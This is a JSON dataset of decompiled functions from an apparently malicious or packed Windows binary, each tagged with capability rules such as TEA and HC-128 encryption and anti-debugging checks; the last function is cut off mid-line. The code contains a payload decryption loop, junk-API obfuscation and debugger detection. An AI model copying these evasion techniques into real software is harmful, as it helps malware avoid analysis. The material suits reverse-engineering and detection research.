{
    "00403550": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "contain loop",
            "get common file path",
            "move file",
            "encrypt data using TEA",
            "manipulate console buffer"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403550(uint32_t *param_1, uint32_t param_2, int32_t *param_3)\n\n{\n    code *pcVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint uStack2488;\n    uchar *puStack2484;\n    uchar *puStack2480;\n    uint uStack2476;\n    uchar *puStack2472;\n    uchar *puStack2468;\n    int32_t iStack2448;\n    uint32_t uStack2444;\n    uint32_t uStack2440;\n    uint32_t uStack2436;\n    uint32_t uStack2432;\n    uint uStack2428;\n    uint32_t *puStack2424;\n    uint32_t uStack2420;\n    uint32_t uStack2412;\n    int32_t iStack2408;\n    int32_t iStack2404;\n    int32_t iStack2400;\n    int32_t iStack2396;\n    int32_t iStack2392;\n    uchar auStack2388 [12];\n    uchar auStack2376 [16];\n    uchar auStack2360 [260];\n    uchar auStack2100 [48];\n    uchar auStack2052 [2052];\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_InterlockedIncrement;\n    uStack2412 = param_2 >> 3;\n    if (uStack2412 != 0) {\n        iStack2392 = -0x61c88647;\n        puStack2424 = param_1;\n        do {\n            puVar2 = puStack2424;\n            if (*0x71a504 == 0x5d) {\n                puStack2468 = NULL;\n                puStack2472 = 0x403599;\n                (*_sym.imp.KERNEL32.dll_GetConsoleAliasesLengthA)();\n                puStack2472 = &stack0xfffff6b8;\n                uStack2476 = 0;\n                puStack2480 = NULL;\n                puStack2484 = &stack0xfffff7fc;\n                uStack2488 = 0;\n                uStack2420 = 0;\n                (*_sym.imp.KERNEL32.dll_ReadConsoleOutputCharacterA)();\n                (*_sym.imp.KERNEL32.dll_MoveFileA)(0x401258, 0x40124c);\n                (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0);\n                (*_sym.imp.KERNEL32.dll_EnumTimeFormatsW)(0, 0, 0);\n                (*_sym.imp.KERNEL32.dll_GetConsoleAliasExesLengthA)();\n                (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, 0, 0);\n                (*_sym.imp.KERNEL32.dll_GetCPInfoExA)(0, 0, &stack0xfffff6a8);\n                (*_sym.imp.KERNEL32.dll_CancelTimerQueueTimer)(0, 0);\n                (*_sym.imp.KERNEL32.dll_BeginUpdateResourceA)(0x401288, 0);\n            }\n            uStack2440 = *puVar2;\n            uVar5 = puVar2[1];\n            iStack2400 = *param_3;\n            iStack2404 = param_3[1];\n            iStack2448 = 0;\n            puStack2468 = 0x403642;\n            iVar3 = fcn.00403540();\n            iStack2396 = *(iVar3 + 8);\n            iStack2448 = iStack2448 + 0x23f;\n            iVar3 = *(iVar3 + 0xc);\n            iStack2408 = 0x20;\n            do {\n                uStack2428 = 5;\n                uVar4 = uStack2440 * 0x10 + iStack2396;\n                if (*0x71a504 == 0xfa9) {\n                    *0x711f5c = 0xedeb2e40;\n                    uStack2428 = 5;\n                }\n                else if (*0x71a504 == 0x3eb) {\n                    puStack2468 = &stack0xfffff6c8;\n                    puStack2472 = 0x401240;\n                    uStack2476 = 0x4036a7;\n                    uStack2428 = 5;\n                    (*_sym.imp.KERNEL32.dll_BuildCommDCBA)();\n                    *0x70ea58 = 0;\n                }\n                uStack2436 = iStack2448 + uStack2440;\n                uStack2444 = (uStack2440 >> 5) + iVar3 ^ uVar4 ^ uStack2436;\n                *0x711f58 = 0xf4ea3dee;\n                if (*0x71a504 == 0x516) {\n                    puStack2468 = NULL;\n                    puStack2472 = NULL;\n                    uStack2476 = 0x4036fc;\n                    (*_sym.imp.KERNEL32.dll_WaitNamedPipeA)();\n                    uStack2476 = 0;\n                    puStack2480 = &stack0xfffff6ac;\n                    puStack2484 = NULL;\n                    uStack2488 = 0x40370b;\n                    (*_sym.imp.KERNEL32.dll_FreeUserPhysicalPages)();\n                    uStack2488 = 0;\n                    (*_sym.imp.KERNEL32.dll_WriteConsoleW)(0, 0, 0, &stack0xfffff6ac);\n                    (*_sym.imp.KERNEL32.dll_MoveFileExW)(0, 0, 0);\n                    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(&stack0xfffff7cc, 0);\n                    (*_sym.imp.KERNEL32.dll_ReadConsoleInputA)(0, &stack0xfffff68c, 0, &stack0xfffff670);\n                    (*_sym.imp.KERNEL32.dll_WriteConsoleInputW)(0, 0, 0, &stack0xfffff678);\n                    (*pcVar1)(&stack0xfffff654);\n                    (*_sym.imp.KERNEL32.dll_EnumCalendarInfoExA)(0, 0, 0, 0);\n                    (*pcVar1)(&stack0xfffff648);\n                }\n                uVar5 = uVar5 - uStack2444;\n                uStack2436 = iStack2448 + uVar5;\n                uStack2444 = (uVar5 >> (uStack2428 & 0x1f)) + iStack2404;\n                uVar4 = uVar5 * 0x10 + iStack2400 ^ uStack2436;\n                uStack2432 = uStack2436;\n                if (*0x71a504 == 0x121) {\n                    puStack2468 = NULL;\n                    puStack2472 = NULL;\n                    uStack2476 = 0;\n                    puStack2480 = 0x4037de;\n                    uStack2420 = uVar5;\n                    (*_sym.imp.KERNEL32.dll_OpenEventA)();\n                }\n                uStack2420 = uVar4 ^ uStack2444;\n                *0x51e0e4 = 0;\n                uStack2440 = uStack2440 - uStack2420;\n                iStack2448 = iStack2448 - iStack2392;\n                iStack2408 = iStack2408 + -1;\n            } while (iStack2408 != 0);\n            *puStack2424 = uStack2440;\n            puStack2424[1] = uVar5;\n            puStack2424 = puStack2424 + 2;\n            uStack2412 = uStack2412 - 1;\n        } while (uStack2412 != 0);\n    }\n    return;\n}\n",
        "token_count": 1680
    },
    "00403ca0": {
        "rules": [
            "check for PEB NtGlobalFlag flag/02e6ad6983154968a9ea3bb4adc24b9d/10fcbce0171842839e4e3d1dbc7c6301"
        ],
        "decompiled_code": "\nvoid fcn.00403ca0(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint uStack2832;\n    uchar *puStack2828;\n    uint uStack2824;\n    uint uStack2820;\n    int32_t iStack2816;\n    uint uStack2204;\n    uint uStack2200;\n    uint uStack2196;\n    uint uStack2192;\n    uint uStack2188;\n    uint uStack2184;\n    uint uStack2180;\n    uint uStack2176;\n    uint uStack2172;\n    uint uStack2168;\n    uint uStack2164;\n    uint uStack2160;\n    uint uStack2156;\n    uint uStack2152;\n    uint uStack2148;\n    uint uStack2144;\n    uint uStack2140;\n    uchar auStack2100 [20];\n    uchar auStack2080 [2080];\n    \n    iVar5 = *0x71a504;\n    *0x71a504 = *0x71a504 + 0xb2d3b;\n    if (iVar5 == -0xb2d25) {\n        (*_sym.imp.USER32.dll_ClientToScreen)();\n        iStack2816 = 0;\n        uStack2820 = 0;\n        uStack2824 = 0x403cd6;\n        (*_sym.imp.WINHTTP.dll_WinHttpWriteData)();\n        uStack2824 = 0;\n        puStack2828 = 0x403cde;\n        (*_sym.imp.KERNEL32.dll_SetConsoleCP)();\n        puStack2828 = &stack0xfffff7cc;\n        uStack2832 = 0x403cec;\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)();\n        uStack2832 = 0;\n        (*_sym.imp.KERNEL32.dll_GetConsoleAliasExesW)(&stack0xfffff7e0);\n        (*_sym.imp.KERNEL32.dll_GetDiskFreeSpaceA)\n                  (0, &stack0xfffff4f0, &stack0xfffff4f4, &stack0xfffff4fc, &stack0xfffff4f8);\n        (*_sym.imp.KERNEL32.dll_SetConsoleMode)(0, 0);\n        (*_sym.imp.KERNEL32.dll_EnumCalendarInfoExA)(0, 0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_SetFileTime)(0, 0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_AddRefActCtx)(0);\n        (*_sym.imp.KERNEL32.dll_FreeLibraryAndExitThread)(0, 0);\n    }\n    pcVar3 = _sym.imp.KERNEL32.dll_GetConsoleProcessList;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetUserDefaultLangID;\n    pcVar1 = _sym.imp.KERNEL32.dll_SetLastError;\n    iVar5 = 0;\n    do {\n        iStack2816 = 0;\n        uStack2820 = 0x403d6c;\n        (*pcVar1)();\n        uStack2820 = 0;\n        uStack2824 = 0;\n        puStack2828 = 0x403d72;\n        (*pcVar3)();\n        if (iVar5 < 0x20bf6a7) {\n            uStack2144 = 0x5b06dccc;\n            uStack2192 = 0x4ca02c3d;\n            uStack2200 = 0x671d6b62;\n            uStack2152 = 0x6f512e38;\n            uStack2160 = 0x3ead18ae;\n            uStack2168 = 0x3f1d7511;\n            uStack2156 = 0x5800515e;\n            uStack2140 = 0x69e1bf2a;\n            uStack2164 = 0x4fe6c76e;\n            uStack2176 = 0x5ad71818;\n            uStack2196 = 0x25635b92;\n            uStack2172 = 0x1c792fce;\n            uStack2180 = 0xe8af86d9;\n            uStack2188 = 0xaa5553c7;\n            uStack2184 = 0x790eca41;\n            uStack2148 = 0xac3f1bce;\n            uStack2204 = 0xc6dbe006;\n            puStack2828 = 0x404d6f;\n            (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        }\n        puStack2828 = 0x404d71;\n        (*pcVar2)();\n    } while ((iVar5 < 0x30949e) && (iVar5 = iVar5 + 1,  iVar5 < 0x21b5b5a));\n    *0x711f62 = 0x65;\n    *0x711f74 = 0x6c;\n    *0x711f64 = 0x72;\n    *0x711f6a = 0x6c;\n    *0x711f76 = 0x6c;\n    iStack2816 = *0x71a504;\n    uStack2820 = 0;\n    *0x711f6c = 0x320033;\n    *0x711f70 = 0x64002e;\n    *0x711f66 = 0x65006e;\n    *0x711f60 = 0x6b;\n    uStack2824 = 0x404dee;\n    *0x70ea64 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)();\n    uStack2824 = 0x404df8;\n    fcn.00403c20();\n    uStack2824 = 0;\n    *0x71a508 = *0x4fc914;\n    puStack2828 = 0x404e11;\n    fcn.00403840();\n    pcVar4 = _sym.imp.KERNEL32.dll_CreateHardLinkW;\n    pcVar3 = _sym.imp.KERNEL32.dll_SetConsoleTitleA;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetFileAttributesA;\n    pcVar1 = _sym.imp.KERNEL32.dll_LCMapStringA;\n    iVar5 = 0;\n    do {\n        if (iVar5 + *0x71a504 == 0x5e) {\n            puStack2828 = NULL;\n            uStack2832 = 0;\n            (*pcVar4)(0);\n            (*pcVar3)(0);\n            (*pcVar2)(0);\n            (*pcVar1)(0, 0, 0x401328, 0, &stack0xfffff7e0, 0);\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasesLengthA)(0);\n            (*_sym.imp.KERNEL32.dll_OpenJobObjectA)(0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_AreFileApisANSI)();\n            (*_sym.imp.KERNEL32.dll_SetFileAttributesW)(0, 0);\n            uStack2204 = 0;\n            fcn.004055d0(&stack0xfffff768, 0, 0x30);\n            (*_sym.imp.KERNEL32.dll_CommConfigDialogW)(0x401338, 0, &stack0xfffff764);\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x40c893);\n    puStack2828 = 0x4f2180;\n    uStack2832 = 0x404eeb;\n    fcn.00403550();\n    pcVar4 = _sym.imp.KERNEL32.dll_EnumResourceNamesA;\n    pcVar3 = _sym.imp.KERNEL32.dll_lstrlenW;\n    pcVar2 = _sym.imp.ADVAPI32.dll_CloseEventLog;\n    pcVar1 = _sym.imp.ADVAPI32.dll_DeregisterEventSource;\n    iVar5 = 0x7b;\n    do {\n        if (*0x71a504 == 0xd) {\n            uStack2832 = 0;\n            (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0);\n            (*pcVar4)(0, 0x401354, 0, 0);\n            (*pcVar3)(0);\n            (*pcVar2)(0);\n            (*pcVar1)(0);\n            (*_sym.imp.ADVAPI32.dll_BackupEventLogA)(0, 0);\n            (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(0, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_LoadResource)(0, 0);\n        }\n        if (*0x71a504 == 0xf) {\n            uStack2832 = 0;\n            (*_sym.imp.KERNEL32.dll_LockResource)();\n            (*_sym.imp.KERNEL32.dll_GetUserDefaultLCID)();\n        }\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    return;\n}\n",
        "token_count": 2001
    },
    "00406404": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406404(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x71add4, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.004061ee();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.004061ac(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "00405936": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405936(int32_t param_1)\n\n{\n    if (*(param_1 + 8) != '\\0') {\n        fcn.00406404(*(param_1 + 4));\n    }\n    *(param_1 + 4) = 0;\n    *(param_1 + 8) = 0;\n    return;\n}\n",
        "token_count": 80
    },
    "00405b0b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00405b0b(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x405bb6;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.00405be2;\n        uStack36 = *0x502220 ^ &fcn.00405b0b::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.00405b0b::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.004074fb();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.00405b0b::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 725
    },
    "00406581": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00406687: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x0040668c)\n// WARNING: Removing unreachable block (ram,0x004066bb)\n// WARNING: Removing unreachable block (ram,0x00406692)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00406581(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t unaff_EBP;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040a730(0x410ef8, 0x20);\n    fcn.0040b867(8);\n    *(unaff_EBP + -4) = 0;\n    pcVar1 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if (*0x71a554 != 1) {\n        *0x71a550 = 1;\n        *0x71a54c = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar2 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x71c428);\n            *(unaff_EBP + -0x30) = piVar2;\n            if (piVar2 != NULL) {\n                piVar3 = (*pcVar1)(*0x71c424);\n                *(unaff_EBP + -0x2c) = piVar3;\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x28) = piVar3;\n                while( true ) {\n                    piVar3 = piVar3 + -1;\n                    *(unaff_EBP + -0x2c) = piVar3;\n                    if (piVar3 < piVar2) break;\n                    iVar4 = fcn.0040734b();\n                    if (*piVar3 != iVar4) {\n                        if (piVar3 < piVar2) break;\n                        pcVar5 = (*pcVar1)(*piVar3);\n                        iVar4 = fcn.0040734b();\n                        *piVar3 = iVar4;\n                        (*pcVar5)();\n                        iVar4 = (*pcVar1)(*0x71c428);\n                        piVar2 = (*pcVar1)(*0x71c424);\n                        if ((*(unaff_EBP + -0x24) != iVar4) || (*(unaff_EBP + -0x28) != piVar2)) {\n                            *(unaff_EBP + -0x24) = iVar4;\n                            *(unaff_EBP + -0x30) = iVar4;\n                            *(unaff_EBP + -0x28) = piVar2;\n                            *(unaff_EBP + -0x2c) = piVar2;\n                            piVar3 = piVar2;\n                        }\n                        piVar2 = *(unaff_EBP + -0x30);\n                    }\n                }\n            }\n            *(unaff_EBP + -0x1c) = 0x401200;\n            while (*(unaff_EBP + -0x1c) < 0x40120c) {\n                if (**(unaff_EBP + -0x1c) != NULL) {\n                    (***(unaff_EBP + -0x1c))();\n                }\n                *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 4;\n            }\n        }\n        *(unaff_EBP + -0x20) = 0x401210;\n        while (*(unaff_EBP + -0x20) < 0x401214) {\n            if (**(unaff_EBP + -0x20) != NULL) {\n                (***(unaff_EBP + -0x20))();\n            }\n            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 4;\n        }\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.0040b78e(8);\n    }\n    return;\n}\n",
        "token_count": 1010
    },
    "004068f2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.004068f2(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.0040b78e(0);\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "00407bbf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407bbf(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x502220) {\n        return;\n    }\n    *0x71b068 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x71b06c = &arg_8h;\n    *0x71afa8 = 0x10001;\n    *0x71af50 = 0xc0000409;\n    *0x71af54 = 1;\n    var_328h = *0x502220;\n    var_324h = *0x502224;\n    *0x71af5c = unaff_retaddr;\n    *0x71b034 = in_GS;\n    *0x71b038 = in_FS;\n    *0x71b03c = in_ES;\n    *0x71b040 = in_DS;\n    *0x71b044 = unaff_EDI;\n    *0x71b048 = unaff_ESI;\n    *0x71b04c = unaff_EBX;\n    *0x71b050 = in_EDX;\n    *0x71b054 = in_ECX;\n    *0x71b058 = in_EAX;\n    *0x71b05c = unaff_EBP;\n    *0x71b060 = unaff_retaddr;\n    *0x71b064 = in_CS;\n    *0x71b070 = in_SS;\n    *0x71afa0 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040b6e5(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x402b78);\n    if (*0x71afa0 == 0) {\n        fcn.0040b6e5(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 832
    },
    "0040861d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040861d(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004074fb();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.004074fb();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "004088e4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004088e4(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.00405d47(*(unaff_EBP + -0x28));\n    iVar1 = fcn.004074fb();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.004074fb();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.00405d20(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.0040867c(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 380
    },
    "0040c524": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.0040c524(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    bool bVar6;\n    int32_t iVar7;\n    uint8_t uVar8;\n    uint32_t *puVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    int32_t iVar16;\n    bool bVar17;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x502220 ^ &stack0xfffffffc;\n    uVar2 = arg_8h[5];\n    uVar15 = *(arg_8h + 3);\n    var_10h = uVar15;\n    uVar4 = *(arg_8h + 1);\n    uVar3 = *arg_8h;\n    uVar12 = uVar2 & 0x7fff;\n    iVar13 = uVar12 - 0x3fff;\n    var_ch = uVar4;\n    var_8h = uVar3 << 0x10;\n    uVar5 = str.5_v_[1];\n    if (iVar13 == -0x3fff) {\n        iVar14 = 0;\n        iVar13 = 0;\n        do {\n            if ((&var_10h)[iVar13] != 0) {\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                break;\n            }\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < 3);\n    }\n    else {\n        bVar6 = false;\n        iVar16 = str.5_v_[0] + L'\\xffffffff';\n        iVar14 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        puVar1 = &var_10h + iVar14;\n        uVar8 = 0x1f - (str.5_v_[0] & 0x1f);\n        if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n            uVar11 = (&var_10h)[iVar14] & ~(-1 << (uVar8 & 0x1f));\n            iVar7 = iVar14;\n            while( true ) {\n                if (uVar11 != 0) {\n                    iVar7 = iVar16 + (iVar16 >> 0x1f & 0x1fU) >> 5;\n                    uVar11 = 1 << (0x1f - (iVar16 & 0x1f) & 0x1f);\n                    puVar9 = &var_10h + iVar7;\n                    var_20h = *puVar9 + uVar11;\n                    if (var_20h < *puVar9) goto code_r0x0040c668;\n                    bVar17 = var_20h < uVar11;\n                    do {\n                        bVar6 = false;\n                        if (!bVar17) goto code_r0x0040c66f;\ncode_r0x0040c668:\n                        do {\n                            bVar6 = true;\ncode_r0x0040c66f:\n                            iVar7 = iVar7 + -1;\n                            *puVar9 = var_20h;\n                            if ((iVar7 < 0) || (!bVar6)) goto code_r0x0040c67d;\n                            puVar9 = &var_10h + iVar7;\n                            var_20h = *puVar9 + 1;\n                        } while (var_20h < *puVar9);\n                        bVar17 = var_20h == 0;\n                    } while( true );\n                }\n                iVar7 = iVar7 + 1;\n                if (2 < iVar7) break;\n                uVar11 = (&var_10h)[iVar7];\n            }\n        }\ncode_r0x0040c67d:\n        *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n        iVar14 = iVar14 + 1;\n        if (iVar14 < 3) {\n            puVar10 = &var_10h + iVar14;\n            for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        iVar14 = iVar13;\n        if (bVar6) {\n            iVar14 = uVar12 - 0x3ffe;\n        }\n        if (iVar14 < *0x5026f4 - str.5_v_[0]) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n        }\n        else {\n            if (*0x5026f4 < iVar14) {\n                if (iVar14 < *0x5026f0) {\n                    iVar14 = iVar14 + str.5_v_[3];\n                    var_10h = var_10h & 0x7fffffff;\n                    iVar13 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << 